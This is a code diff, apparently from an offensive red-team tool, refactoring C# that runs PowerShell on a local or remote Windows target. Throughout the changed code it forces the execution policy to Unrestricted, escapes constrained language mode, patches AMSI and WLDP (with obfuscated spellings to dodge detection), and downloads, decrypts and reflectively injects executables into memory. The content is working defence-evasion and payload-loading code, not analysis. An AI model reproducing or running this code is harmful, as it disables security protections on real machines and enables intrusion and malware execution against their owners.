@@ -515,6 +515,7 @@ function Invoke-DecryptAssembly
             var escape_lockdown = false;
             var use_ssl = false;
             var use_powershell_decryption = false;
+            var display_target = string.Empty;
             DecryptionMethod decryptionMethod = DecryptionMethod.CSHARP;
             var aes_key = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
@@ -541,10 +542,10 @@ function Invoke-DecryptAssembly
                 {"n|skip-bypass=", "Skip A.M.S.I (A), WLDP (W) or ALL (*) Bypass techniques", o => skip_bypass = o},
                 {"l|lockdown-escape", "Try to enable PowerShell FullLanguage mode using REGINI", o => escape_lockdown = true},
                 {"w|wldp-bypass=", "Uses the given PowerShell script to bypass WLDP (fs, smb o http[s])", o => wldp_bypass = o},
-                {"wx|encrypted-wldp", "Indicates that provided WLDP bypass is encrypted", o => wldp_bypass_encrypted = true},
+                {"wX|encrypted-wldp", "Indicates that provided WLDP bypass is encrypted", o => wldp_bypass_encrypted = true},
                 {"x|executable=", "[Download and] Execute given executable", o => execute_assembly = o},
-                {"xx|encrypted-executable", "Indicates that provided Exe/DLL is encrypted", o => assembly_encrypted = true},
-                {"xcs|executable-csharp", "Indicates that the executable provided is C# (.NET)", o => is_dotnet = true},
+                {"xX|encrypted-executable", "Indicates that provided Exe/DLL is encrypted", o => assembly_encrypted = true},
+                {"xCS|executable-csharp", "Indicates that the executable provided is C# (.NET)", o => is_dotnet = true},
                 {"R|reflective-injection", "Uses Invoke-ReflectivePEInjection to load the assmebly from memory (requires Invoke-ReflectivePEInjection to be imported!)", o => reflective_injection = true},
                 {"P|powershell-decrypt", "Force use of PowerShell-based decryption", o => use_powershell_decryption = true},
                 {"k|encryption-key=", "Uses the provided key for encryption/decryption", o => aes_key = o},
@@ -607,10 +608,12 @@ function Invoke-DecryptAssembly
                     throw new ArgumentNullException("[-] Reflective Injection requires an Assembly to load!");
                 }
 
+                display_target = target;
                 if (string.IsNullOrEmpty(target))
                 {
                     Console.WriteLine("[*] No target given, using current machine name");
                     target = null;
+                    display_target = Environment.MachineName;
                 }
                 if (!string.IsNullOrEmpty(imports))
                 {
@@ -661,195 +664,112 @@ function Invoke-DecryptAssembly
                     conn = null;
                 }
 
+
+                if (escape_lockdown)
+                {
+                    using (var runspace = CreateRunSpace(conn)) {
+                    runspace.Open();
+
+                    Console.WriteLine("[*] Attempting to enable FullLanguage Mode");
+                    if (!AttemptRegalBypass(runspace))
+                    {
+                        Console.WriteLine($"[-] Could not set Lockdown Policy -> FullLanguage on {display_target}");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[+] Enabled FullLanguage Mode");
+                    }
+                    }
+                }
+
                 using (var runspace = CreateRunSpace(conn))
                 {
                     runspace.Open();
-                    if (escape_lockdown)
-                    {
-                        Console.WriteLine("[*] Attempting to enable FullLanguage Mode");
-                        if (!AttemptRegalBypass(runspace))
-                        {
-                            Console.WriteLine($"[-] Could not set Lockdown Policy -> FullLanguage on {target}");
-                        }
-                        else
-                        {
-                            Console.WriteLine("[+] Enabled FullLanguage Mode");
-                        }
-                    }
 
                     PowerShell ps = PowerShell.Create();
                     ps.Runspace = runspace;
 
-                    if (runspace.RunspaceIsRemote)
+                    if (!UnrestrictedPolicyByPowerShell(ps))
                     {
-                        if (!UnrestrictedPolicyByPowerShell(ps))
-                        {
-                            Console.WriteLine($"[-] Could not set Execution-Policy -> Unrestricted on {target}");
-                        }
-                        else
-                        {
-                            Console.WriteLine("[+] Set Execution-Policy -> Unrestricted");
-                        }
-
-                        if (skip_bypass.Equals("W") || string.IsNullOrEmpty(skip_bypass))
-                        {
-                            if (!BypassWithRemoteModule(ps, am_si_bypass_module, amsi_encrypted, aes_key, decryptionMethod))
-                            {
-                                Console.WriteLine("[*] WARNING: A.M.S.I Bypass FAILED!");
-                            }
-                            else
-                            {
-                                Console.WriteLine("[+] A.|\\/|SI -> Patched!");
-                            }
-                        }
-
-                        if (skip_bypass.Equals("A") || string.IsNullOrEmpty(skip_bypass))
-                        {
-                            Console.WriteLine("[*] Attempt WLDP Bypass");
-                            if (!BypassWithRemoteModule(ps, wldp_bypass, wldp_bypass_encrypted, aes_key, decryptionMethod))
-                            {
-                                Console.WriteLine("[*] WARNING: WLDP Bypass FAILED!");
-                            }
-                            else
-                            {
-                                Console.WriteLine("[+] WLDP -> Patched!");
-                            }
-                        }
-
-
-                        bool success = false;
-                        if (!string.IsNullOrEmpty(execute_assembly))
-                        {
-                            Console.Write("[*] Loading assembly to execute... ");
-                            code = PSLoadAssembly(ps, code, execute_assembly, assembly_encrypted, aes_key, reflective_injection, is_dotnet, decryptionMethod, ref success);
-                            if (success)
-                            {
-                                Console.WriteLine("SUCCESS");
-                            }
-                            else
-                            {
-                                Console.WriteLine("FAILURE");
-                            }
-
-                        }
-
-                        string display_command = code;
-                        Console.Write("[*] Importing modules");
-                        ImportModulesByPowerShell(ps, array_imports, imports_encrypted, aes_key, decryptionMethod);
-                        if (code.Length > CODE_LEN_MAX)
-                        {
-                            display_command = code.Substring(0, 45) + " ... " + code.Substring(code.Length - 45);
-                        }
-                        Console.WriteLine($"[*] Executind command: {display_command}");
-                        ExecuteByPowerShell(ps, code, redirect, outstring, encoded);
-
+                        Console.WriteLine($"[-] Could not set Execution-Policy -> Unrestricted on {display_target}");
                     }
                     else
                     {
-                        bool unrestricted = false;
-                        RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
-                        if (!UnrestrictedPolicyByRunspaceInvoker(runSpaceInvoker, runspace))
-                        {
-                            Console.WriteLine("[-] Could not set Execution-Policy -> Unrestricted");
-                        }
-                        else
-                        {
-                            Console.WriteLine("[+] Set Execution-Policy -> Unrestricted");
-                            unrestricted = true;
-                        }
+                        Console.WriteLine("[+] Set Execution-Policy -> Unrestricted");
+                    }
 
-                        if (skip_bypass.Equals("W") || string.IsNullOrEmpty(skip_bypass))
-                        {
+                    if (skip_bypass.Equals("W") || string.IsNullOrEmpty(skip_bypass))
+                    {
 
-                            Console.WriteLine("[*] Attempt A.M.S.I Bypass");
-                            if (string.IsNullOrEmpty(am_si_bypass_module))
-                            {
-                                if (!BuiltinAmsiBypass(ps))
-                                {
-                                    Console.WriteLine("[*] WARNING: A.M.S.I Bypass FAILED!");
-                                }
-                            }
-                            else if (!BypassWithRemoteModule(ps, am_si_bypass_module, amsi_encrypted, aes_key, decryptionMethod))
+                        Console.WriteLine("[*] Attempt A.M.S.I Bypass");
+                        if (string.IsNullOrEmpty(am_si_bypass_module) && !runspace.RunspaceIsRemote)
+                        {
+                            if (!BuiltinAmsiBypass(ps))
                             {
                                 Console.WriteLine("[*] WARNING: A.M.S.I Bypass FAILED!");
-
-                            }
-                            else
-                            {
-                                Console.WriteLine("[+] A.|\\/|SI -> Patched!");
                             }
                         }
-
-                        if (!unrestricted) {
-                            if (!UnrestrictedPolicyByPowerShell(ps))
-                            {
-                                Console.WriteLine($"[-] Could not set Execution-Policy -> Unrestricted on {target}");
-                            }
-                            else
-                            {
-                                Console.WriteLine("[+] Set Execution-Policy -> Unrestricted");
-                            }
-                        }
-
-                        if (skip_bypass.Equals("A") || string.IsNullOrEmpty(skip_bypass))
+                        else if (!BypassWithRemoteModule(ps, am_si_bypass_module, amsi_encrypted, aes_key, decryptionMethod))
                         {
+                            Console.WriteLine("[*] WARNING: A.M.S.I Bypass FAILED!");
 
-                            Console.WriteLine("[*] Attempt WLDP Bypass");
-                            if (string.IsNullOrEmpty(am_si_bypass_module))
-                            {
-                                if (!BuiltinWldpBypass(ps))
-                                {
-                                    Console.WriteLine("[*] WARNING: WLDP Bypass FAILED!");
-                                }
-                            }
-                            else if (!BypassWithRemoteModule(ps, wldp_bypass, wldp_bypass_encrypted, aes_key, decryptionMethod))
-                            {
-                                Console.WriteLine("[*] WARNING: WLDP Bypass FAILED!");
-
-                            }
-                            else
-                            {
-                                Console.WriteLine("[+] WLDP -> Patched!");
-                            }
-                        }
-
-                        bool success = false;
-                        if (!string.IsNullOrEmpty(execute_assembly))
-                        {
-                            Console.Write("[*] Loading assembly to execute... ");
-                            code = PSLoadAssembly(ps, code, execute_assembly, assembly_encrypted, aes_key, reflective_injection, is_dotnet, decryptionMethod ,ref success);
-                            if (success) {
-                                Console.WriteLine("SUCCESS");
-                            }
-                            else
-                            {
-                                Console.WriteLine("FAILURE");
-                            }
-
-                        }
-
-                        string display_command = code;
-                        if (code.Length > CODE_LEN_MAX)
-                        {
-                            display_command = code.Substring(0, 45) + " ... " + code.Substring(code.Length - 45);
-                        }
-
-                        if (!imports_encrypted)
-                        {
-
-                            ImportModulesByRunspaceInvoker(runSpaceInvoker, array_imports);
-                            Console.WriteLine($"[*] Executind command: {display_command}");
-                            ExecuteByRunspace(runspace, code, redirect, outstring, encoded);
                         }
                         else
                         {
-                            ImportModulesByPowerShell(ps, array_imports, imports_encrypted, aes_key, decryptionMethod);
-                            Console.WriteLine($"[*] Executind command: {display_command}");
-                            ExecuteByPowerShell(ps, code, redirect, outstring, encoded);
-
-
+                            Console.WriteLine("[+] A.|\\/|SI -> Patched!");
                         }
                     }
+
+                    if (skip_bypass.Equals("A") || string.IsNullOrEmpty(skip_bypass))
+                    {
+
+                        Console.WriteLine("[*] Attempt WLDP Bypass");
+                        if (string.IsNullOrEmpty(am_si_bypass_module) && !runspace.RunspaceIsRemote)
+                        {
+                            if (!BuiltinWldpBypass(ps))
+                            {
+                                Console.WriteLine("[*] WARNING: WLDP Bypass FAILED!");
+                            }
+                        }
+                        else if (!BypassWithRemoteModule(ps, wldp_bypass, wldp_bypass_encrypted, aes_key, decryptionMethod))
+                        {
+                            Console.WriteLine("[*] WARNING: WLDP Bypass FAILED!");
+
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] WLDP -> Patched!");
+                        }
+                    }
+
+                    bool success = false;
+                    if (!string.IsNullOrEmpty(execute_assembly))
+                    {
+                        Console.Write("[*] Loading assembly to execute... ");
+                        code = PSLoadAssembly(ps, code, execute_assembly, assembly_encrypted, aes_key, reflective_injection, is_dotnet, decryptionMethod, ref success);
+                        if (success)
+                        {
+                            Console.WriteLine("SUCCESS");
+                        }
+                        else
+                        {
+                            Console.WriteLine("FAILURE");
+                        }
+
+                    }
+
+                    string display_command = code;
+                    Console.WriteLine("[*] Importing modules");
+                    ImportModulesByPowerShell(ps, array_imports, imports_encrypted, aes_key, decryptionMethod);
+                    if (code.Length > CODE_LEN_MAX)
+                    {
+                        display_command = code.Substring(0, 45) + " ... " + code.Substring(code.Length - 45);
+                    }
+                    Console.WriteLine($"[*] Executind command: {display_command}");
+                    ExecuteByPowerShell(ps, code, redirect, outstring, encoded);
+
+
+
                 }
             }
             catch (Exception e)
